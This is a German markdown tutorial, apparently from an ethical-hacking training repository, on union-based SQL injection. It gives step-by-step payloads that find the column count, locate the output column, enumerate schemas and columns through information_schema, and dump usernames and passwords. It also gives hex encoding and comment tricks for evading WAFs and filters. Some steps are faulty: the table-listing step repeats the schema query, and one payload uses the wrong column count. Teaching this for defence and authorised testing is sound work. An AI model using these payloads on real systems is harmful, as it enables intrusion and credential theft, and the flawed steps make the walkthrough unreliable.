# 🎣 Union-Based SQL Injection Attack

Dieses Dokument beschreibt die Methodik und Durchführung einer **Union-Based SQL-Injection** zur Extraktion von Datenbankinformationen (Schema, Tabellen, Spalten) und anschließender Datenextraktion. Das Wissen dient der **defensiven Härtung** von Webanwendungen und der Durchführung ethischer Penetration Tests.


## Inhaltsverzeichnis
- [Ziel](#ziel)
- [Beispielhafte Schritte zur Datenextraktion mit `GROUP_CONCAT`](#beispielhafte-schritte-zur-datenextraktion-mit-group_concat)
- [Hinweise](#hinweise)
- [Sicherheitshinweis](#sicherheitshinweis)
- [Haftungsausschluss](#haftungsausschluss)



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Ziel

Ziel ist die schrittweise Extraktion von Datenbankinformationen über die `UNION SELECT`-Technik.

**Voraussetzung für Union-Based SQLi**

Eine Union-Based Injection ist nur erfolgreich, wenn zwei kritische Bedingungen erfüllt sind:

1. **Anfälligkeit:** Der angefragte Parameter (z. B. `id=1`, `search=query`) wird ungefiltert im originalen SQL-Statement verwendet.

2. **Abfragekompatibilität:** Die neue `SELECT`-Abfrage (die injizierte Union-Abfrage) muss mit der ursprünglichen Abfrage kompatibel sein.    
Dies bedeutet:
    
   - Die injizierte Abfrage muss exakt die gleiche Anzahl von Spalten (`columns`) aufweisen.

   - Die injizierten Spalten müssen denselben Datentyp (oder einen kompatiblen Typ, z.B. Strings) wie die ursprünglichen Spalten besitzen.



<div align=right>


[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## 1. Konzeptionelle Erläuterung der UNION `SELECT`-Technik

Die `UNION`-Operation in SQL kombiniert die Ergebnismengen von zwei oder mehr separaten `SELECT`-Anweisungen in einer einzigen Ergebnismenge.

Der Angriff nutzt aus, dass die Webanwendung nur die Ergebnisse der ursprünglichen Abfrage (`Original SELECT Statement`) erwartet und diese auf der Seite ausgibt. Wenn wir eine zusätzliche `SELECT`-Abfrage anfügen, die Datenbankinformationen enthält, werden diese Informationen zusammen mit den regulären Daten im Ausgabefeld der Webseite angezeigt.




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## 2. Schritt 1: Ermittlung der Spaltenanzahl (`ORDER BY`)

Bevor Daten extrahiert werden können, muss die exakte Anzahl der vom ursprünglichen Statement angefragten Spalten ermittelt werden. Hierfür wird die ORDER BY-Klausel verwendet.


| Abfrage           | Ergebnis | Ziel |
|-------------------|----------|------|
| `' ORDER BY 1 --` | Erfolgreich | Sortiert nach Spalte 1. |
| `' ORDER BY 2 --` | Erfolgreich | Sortiert nach Spalte 2. |
| `' Order By N --` | **Fehlermeldung** | `ORDER BY` schlägt fehl, wenn N > Anzahl der Spalten. **N-1** ist die gesuchte Spaltenanzahl. |


**Beispiel für die Ermittlung:**

```text
# 1. Start mit einer hohen oder geschätzten Zahl:
test' ORDER BY 10 --

# 2. Datenbank wirft Fehler: "Unknown column '10' in 'order clause'"

# 3. Zahl reduzieren, bis kein Fehler auftritt (z.B. bei 4) und der Fehler bei 5 wieder auftritt.

# Ergebnis: Die ursprüngliche Abfrage verwendet 4 Spalten.
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## 3. Schritt 2: Ermittlung der verwundbaren Spalten (NULL Payload)

Sobald die Spaltenanzahl (`N`) bekannt ist, wird ein `UNION SELECT`-Statement mit `N` Platzhaltern (meist `NULL`-Werte) injiziert.

- **Zweck von `NULL`:** Da `NULL` in den meisten DBMS-Systemen mit fast jedem Datentyp kompatibel ist, dient es als Typen-Placeholder, um die Kompatibilitätsanforderung zu erfüllen.

- **Identifizierung der Ausgabespalte:** Wir ersetzen nacheinander einen `NULL`-Wert durch eine Zahl (z.B. `1`, `2`, `3`, `4`). Nur die Spalte, deren Wert sichtbar auf der Webseite erscheint, ist die verwundbare Ausgabespalte, in die wir unsere Daten injizieren können.




**Beispiel (N=4 Spalten):**

```text
# Payload:
test' UNION SELECT NULL, NULL, 3, NULL --
```

Angenommen, der Wert 3 wird auf der Webseite angezeigt, dann ist die dritte Spalte der Ausgabepunkt für die nachfolgende Datenextraktion.




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## 4. Schritt 3: Datenextraktion mit `GROUP_CONCAT`

Nachdem die verwundbare Spalte identifiziert wurde (im Beispiel: Spalte 3), kann diese durch Datenbankfunktionen ersetzt werden, um gezielte Informationen zu extrahieren.

> **Wichtig:** Wir nutzen die information_schema, eine systemeigene Datenbank (primär in MySQL), die Metadaten über alle anderen Datenbanken, Tabellen, Spalten und Zugriffsrechte speichert.


- **`group_concat():`** Fasst mehrere Zeilen zu einem einzigen String zusammen. Dies ist essentiell, da die Webanwendung oft nur die erste Ergebniszeile ausgibt.

- **Hex-Kodierung (0x...):** Die Hexadezimaldarstellung (z.B. `0x3a3a` für `::` als Trennzeichen) kann helfen, wenn Web Application Firewalls (WAFs) oder spezifisches Escaping Klartext-Strings wie `'::'` filtern würden.

### Beispielhafte Schritte zur Datenextraktion mit `GROUP_CONCAT`

1. **Test auf Verwundbarkeit mit UNION SELECT**
```sql
test' UNION SELECT 1,2,3 FROM table_name --
```

2. **Schemas (Datenbanken) anzeigen:**
```sql
test' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --
```

3. **Tabellennamen der aktuellen Datenbank anzeigen:**
```sql
test' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --
```

4. **Spaltennamen aus einer bestimmten Tabelle anzeigen (Klartextname):**
```sql
test' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --
```

5. **Spaltennamen anzeigen mit Hex-Wert für Tabellenname (Bypass & Genauigkeit):**
```sql
test' UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_name=0x7573657273 --
```

💡 `users` in Hex: 0x7573657273
Tool für Umwandlung: [Codebeautify – String to Hex](https://codebeautify.org/string-hex-converter)

6. **Nutzerdaten ausgeben (z.B. Username & Passwort):**
```sql
test' UNION SELECT 1,group_concat(username,0x3a3a,password),3 FROM users --
```


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Hinweise für Ethical Hacker

1. **Fehlerbasierte Abfrage:** Wenn eine Union-Based Injection nicht sofort funktioniert, kann eine Error-Based SQL Injection (z.B. durch `EXTRACTVALUE` oder `UPDATEXML`-Funktionen in MySQL) oft schneller die Datenbankversion und den aktuellen Benutzer verraten.

- **Blinde Abfragen:** Wenn die Ergebnisse der `UNION SELECT` nicht direkt auf der Seite erscheinen (`Blind SQLi`), müssen Techniken wie Time-Based oder Boolean-Based Injections angewendet werden (z.B. mit `IF` und `SLEEP`).

- **Filtrations-Bypässe:** Bei komplexen Filtern sollten zusätzliche Bypässe in Betracht gezogen werden: Groß-/Kleinschreibung, Kommentare (`/**/)`, URL-Kodierung oder String-Manipulationen (`CONCAT`).


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Hinweise
- `group_concat()` ist hilfreich zum Kombinieren mehrerer Ergebnisse in einer Zeile.

- Hexadezimaldarstellung (0x...) kann helfen, Filter oder Escaping-Probleme zu umgehen.

- Kommentare wie -- oder --+ beenden den ursprünglichen SQL-Befehl korrekt.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Sicherheitshinweis

Dieses Wissen dient ausschließlich der legalen Anwendung im Rahmen von Penetration Tests mit ausdrücklicher Erlaubnis. Der Missbrauch kann strafrechtlich verfolgt werden.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z.B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Oktober 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---
